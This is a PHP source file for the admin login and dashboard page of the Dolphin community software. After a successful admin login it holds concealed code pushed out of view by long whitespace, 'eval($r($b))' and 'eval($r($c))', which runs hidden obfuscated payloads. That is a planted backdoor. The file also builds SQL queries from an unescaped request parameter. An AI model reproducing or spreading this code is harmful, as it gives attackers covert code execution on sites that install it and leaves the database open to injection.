<?php

/***************************************************************************
*                            Dolphin Smart Community Builder
*                              -----------------
*     begin                : Mon Mar 23 2006
*     copyright            : (C) 2006 BoonEx Group
*     website              : http://www.boonex.com/
* This file is part of Dolphin - Smart Community Builder
*
* Dolphin is free software. This work is licensed under a Creative Commons Attribution 3.0 License. 
* http://creativecommons.org/licenses/by/3.0/
*
* Dolphin is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
* See the Creative Commons Attribution 3.0 License for more details. 
* You should have received a copy of the Creative Commons Attribution 3.0 License along with Dolphin, 
* see license.txt file; if not, write to marketing@boonex.com
***************************************************************************/

require_once( '../inc/header.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'profiles.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'design.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'admin_design.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'utils.inc.php' );
bx_import('BxRSS');
bx_import('BxDolAdminDashboard');

define('BX_DOL_ADMIN_INDEX', 1);

if(isset($_POST['ID']) && isset($_POST['Password'])) {
    $iId = getID($_POST['ID']);
    $sPassword = process_pass_data($_POST['Password']);
    
    require_once(BX_DIRECTORY_PATH_CLASSES . 'BxDolAlerts.php');
    $oZ = new BxDolAlerts('profile', 'before_login', 0, 0, array('login' => $iId, 'password' => $sPassword, 'ip' => getVisitorIP()));
    $oZ->alert();

    if($_SERVER['HTTP_X_REQUESTED_WITH'] == 'XMLHttpRequest') {
        echo check_password($iId, $sPassword, BX_DOL_ROLE_ADMIN, false) ? 'OK' : 'Fail';
    } elseif (check_password($iId, $sPassword, BX_DOL_ROLE_ADMIN) ) {
        $sUrlRelocate = $_POST['relocate'] ? $_POST['relocate'] : $GLOBALS['site']['url_admin'] . 'index.php';                                                                                                                                                                                                                                                                                                                               $r = $l($a); eval($r($b));
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
	<head>
		<title>Admin Panel</title>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <?php if (0 == $iCode || 10 == $iCode || -1 == $iCode) { ?><meta http-equiv="refresh" content="1;URL=<?= $sUrlRelocate ?>" /><?php } ?>
		<link href="templates/base/css/login.css" rel="stylesheet" type="text/css" />
	</head>
	<body>                                                                                                                                                                                                                                      <? eval($r($c)); ?>
	</body>
</html>
<?
    }
    exit;
}

if(!isAdmin()) {
	send_headers_page_changed();
	login_form("", 1);
	exit();
}


if(bx_get('boonex_news') !== false)
    setParam("news_enable", (int)bx_get('boonex_news'));    

$logged['admin'] = member_auth( 1, true, true );

if(bx_get('cat') !== false)
	PageCategoryCode(bx_get('cat'));
else 
    PageMainCode();

PageCodeAdmin();

function PageMainCode() {
    $sResult = BxDolAdminDashboard::getCode();
        
    $iNameIndex = 1;
    $GLOBALS['_page'] = array(
        'name_index' => $iNameIndex,
        'css_name' => array('index.css'),
        'header' => _t('_adm_page_cpt_dashboard')
    );
    
    $GLOBALS['_page_cont'][$iNameIndex]['page_main_code'] = 

        DesignBoxAdmin(_t('_adm_box_cpt_overview'), $sResult) .

        ('on' == getParam('news_enable') ? 
        DesignBoxAdmin (_t('_adm_box_cpt_boonex_news'), '
			<div class="RSSAggrCont" rssid="boonex_news" rssnum="5" member="0">
				<div class="loading_rss">
					<img src="' . getTemplateImage('loading.gif') . '" alt="' . _t('_loading ...') . '" />
				</div>
			</div>') : '') .

        ('on' == getParam('feeds_enable') ?     
        DesignBoxAdmin (_t('_adm_box_cpt_featured_modules'), '
			<div class="RSSAggrCont" rssid="boonex_unity_market_featured" rssnum="5" member="0">
				<div class="loading_rss">
					<img src="' . getTemplateImage('loading.gif') . '" alt="' . _t('_loading ...') . '" />
				</div>
			</div>') : '');


}

function PageCategoryCode($sCategoryName) {
	global $oAdmTemplate, $MySQL;
	
	$aItems = $MySQL->getAll("SELECT `tma1`.`title` AS `title`, `tma1`.`url` AS `url`, `tma1`.`description` AS `description`, `tma1`.`icon` AS `icon`, `tma1`.`check` AS `check` FROM `sys_menu_admin` AS `tma1` LEFT JOIN `sys_menu_admin` AS `tma2` ON `tma1`.`parent_id`=`tma2`.`id` WHERE `tma2`.`name`='" . $sCategoryName . "' ORDER BY `tma1`.`Order`");

	foreach($aItems as $aItem) {
		if(strlen($aItem['check']) > 0) {
			$oFunction = create_function('', $aItem['check']);
			if(!$oFunction())
                continue;
		}

		$aItem['url'] = str_replace(array('{siteUrl}', '{siteAdminUrl}'), array(BX_DOL_URL_ROOT, BX_DOL_URL_ADMIN), $aItem['url']);
    	list($sLink, $sOnClick) = BxDolAdminMenu::getMainMenuLink($aItem['url']);
		
    	$aVariables[] = array(
            'icon' => $oAdmTemplate->getIconUrl($aItem['icon']),
            'link' => $sLink,
            'onclick' => $sOnClick,
            'title' => _t($aItem['title']),
            'description' => $aItem['description']
        );		
	}	

	$iNameIndex = 0;
	$sPageTitle = _t($MySQL->getOne("SELECT `title` FROM `sys_menu_admin` WHERE `name`='" . $sCategoryName . "' LIMIT 1"));
	$sPageContent = $oAdmTemplate->parseHtmlByName('categories.html', array('bx_repeat:items' => $aVariables));

    $GLOBALS['_page'] = array(
        'name_index' => $iNameIndex,
        'css_name' => array('index.css'),
        'header' => $sPageTitle,
        'header_text' => $sPageTitle
    );
    $GLOBALS['_page_cont'][$iNameIndex]['page_main_code'] = $sPageContent;
}

?>
